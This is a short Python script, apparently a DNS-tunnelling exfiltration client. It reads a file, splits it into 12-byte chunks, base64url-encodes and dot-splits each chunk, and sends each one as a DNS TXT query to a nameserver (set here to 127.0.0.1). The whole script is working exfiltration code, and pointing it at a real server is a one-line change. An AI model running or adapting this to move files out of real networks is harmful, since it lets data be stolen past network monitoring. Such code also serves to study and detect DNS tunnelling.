__author__ = "Adel Tchernitsky"


import dns.resolver
import base64


DNS_SERVER = ["127.0.0.1"]
DNS_PORT = 53
FILE_NAME = "org.txt"


def b64_dns_encode(data: bytes) -> str:
    encoded = base64.urlsafe_b64encode(data).decode("ascii")
    return encoded.rstrip("=")


def dot_every_n(s: str, n: int = 2) -> str:
    return ".".join(s[i:i+n] for i in range(0, len(s), n))


def split_bytes(data, chunk_size):
    return [data[i:i + chunk_size] for i in range(0, len(data), chunk_size)]


def get_messages():
    with open(FILE_NAME, "rb") as f:
        data = f.read()

    final_messages = []
    chunks = split_bytes(data, 12)
    for ch in chunks:
        encoded = b64_dns_encode(ch)
        final_messages.append(dot_every_n(encoded, 2))
    final_messages[-1] += ".end"
    return final_messages


def send_message():
    resolver = dns.resolver.Resolver()
    resolver.nameservers = DNS_SERVER
    resolver.port = DNS_PORT

    messages = get_messages()
    print(messages)

    for domain in messages:
        try:
            answers = resolver.resolve(domain, "TXT")

            for rdata in answers:
                response = b"".join(rdata.strings).decode()
                print(f"Response: {response}")

        except Exception as e:
            print(f"Error: {e}")
            return


def main():
    send_message()


if __name__ == "__main__":
    main()
